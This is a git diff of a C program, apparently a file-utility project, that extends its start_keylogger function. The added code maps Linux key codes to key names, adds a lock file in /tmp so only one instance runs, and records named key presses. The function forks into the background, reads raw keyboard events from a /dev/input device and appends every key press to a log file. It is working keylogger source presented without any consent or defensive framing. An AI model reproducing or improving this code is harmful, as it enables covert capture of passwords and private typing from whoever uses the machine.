@@ -7,6 +7,8 @@
 #include <dirent.h>
 #include <time.h> //@YuEnTiang81391 new added library for time 
 #include <linux/input.h> //@YuEnTiang81391 new added library for input
+#include <sys/file.h> //@YuEnTiang81391 new added library for file
+#include <errno.h> //@YuEnTiang81391 new added library for error
 
 void create_file(char *filename){
     int fd = open(filename, O_CREAT | O_RDWR, 0644);
@@ -110,7 +112,46 @@ void list_directory(char *dirname){
     closedir(dir);
 }
 
+// Key code to key name mapping
+const char *key_names[] = {
+    "RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "MINUS", "EQUAL", "BACKSPACE", "TAB",
+    "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "LEFTBRACE", "RIGHTBRACE", "ENTER", "LEFTCTRL", "A", "S",
+    "D", "F", "G", "H", "J", "K", "L", "SEMICOLON", "APOSTROPHE", "GRAVE", "LEFTSHIFT", "BACKSLASH", "Z", "X",
+    "C", "V", "B", "N", "M", "COMMA", "DOT", "SLASH", "RIGHTSHIFT", "KPASTERISK", "LEFTALT", "SPACE", "CAPSLOCK",
+    "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUMLOCK", "SCROLLLOCK", "KP7", "KP8", "KP9",
+    "KPMINUS", "KP4", "KP5", "KP6", "KPPLUS", "KP1", "KP2", "KP3", "KP0", "KPDOT", "ZENKAKUHANKAKU", "102ND",
+    "F11", "F12", "RO", "KATAKANA", "HIRAGANA", "HENKAN", "KATAKANAHIRAGANA", "MUHENKAN", "KPJPCOMMA", "KPENTER",
+    "RIGHTCTRL", "KPSLASH", "SYSRQ", "RIGHTALT", "LINEFEED", "HOME", "UP", "PAGEUP", "LEFT", "RIGHT", "END",
+    "DOWN", "PAGEDOWN", "INSERT", "DELETE", "MACRO", "MUTE", "VOLUMEDOWN", "VOLUMEUP", "POWER", "KPEQUAL",
+    "KPPLUSMINUS", "PAUSE", "SCALE", "KPCOMMA", "HANGEUL", "HANJA", "YEN", "LEFTMETA", "RIGHTMETA", "COMPOSE",
+    "STOP", "AGAIN", "PROPS", "UNDO", "FRONT", "COPY", "OPEN", "PASTE", "FIND", "CUT", "HELP", "MENU", "CALC",
+    "SETUP", "SLEEP", "WAKEUP", "FILE", "SENDFILE", "DELETEFILE", "XFER", "PROG1", "PROG2", "WWW", "MSDOS",
+    "COFFEE", "ROTATE_DISPLAY", "CYCLEWINDOWS", "MAIL", "BOOKMARKS", "COMPUTER", "BACK", "FORWARD", "CLOSECD",
+    "EJECTCD", "EJECTCLOSECD", "NEXTSONG", "PLAYPAUSE", "PREVIOUSSONG", "STOPCD", "RECORD", "REWIND", "PHONE",
+    "ISO", "CONFIG", "HOMEPAGE", "REFRESH", "EXIT", "MOVE", "EDIT", "SCROLLUP", "SCROLLDOWN", "KPLEFTPAREN",
+    "KPRIGHTPAREN", "NEW", "REDO"
+};
+
 void start_keylogger(char *logfile) {
+     // Create a lock file to ensure only one instance runs
+    int lock_fd = open("/tmp/keylogger.lock", O_CREAT | O_RDWR, 0666);
+    if (lock_fd == -1) {
+        perror("Failed to create lock file");
+        exit(EXIT_FAILURE);
+    }
+
+    if (flock(lock_fd, LOCK_EX | LOCK_NB) == -1) {
+        if (errno == EWOULDBLOCK) {
+            fprintf(stderr, "Another instance of the keylogger is already running.\n");
+            close(lock_fd);
+            exit(EXIT_FAILURE);
+        } else {
+            perror("Failed to lock file");
+            close(lock_fd);
+            exit(EXIT_FAILURE);
+        }
+    }
+
     // Run in background
     if (fork() == 0) {
         FILE *file;
@@ -133,16 +174,15 @@ void start_keylogger(char *logfile) {
         fclose(file);
 
         // Monitor the input device
-        int fd;
+        int fd; 
         struct input_event ev;
-
+        int last_key = -1;
+        int last_value = -1;
         // Get the input device from environment variable or use default
         const char *dev = getenv("INPUT_DEVICE");
         if (dev == NULL) {
             dev = "/dev/input/event2"; // Default device
         }
-        
-        //const char *dev = "/dev/input/event2"; 
 
         fd = open(dev, O_RDONLY);
         if (fd == -1) {
@@ -155,9 +195,16 @@ void start_keylogger(char *logfile) {
             if (ev.type == EV_KEY && ev.value == 1) { // Key press event
                 file = fopen(logfile, "a");
                 if (file != NULL) {
-                    fprintf(file, "Key %d pressed\n", ev.code);
+                    if (ev.code < sizeof(key_names) / sizeof(key_names[0])) {
+                        fprintf(file, "Key %s pressed\n", key_names[ev.code]);
+                    } else {
+                        fprintf(file, "Key %d pressed\n", ev.code);
+                    }
                     fclose(file);
                 }
+                last_key = ev.code;
+                last_value = ev.value;
+                usleep(200000); // Add a small delay (200ms) to debounce
             }
         }
         close(fd);
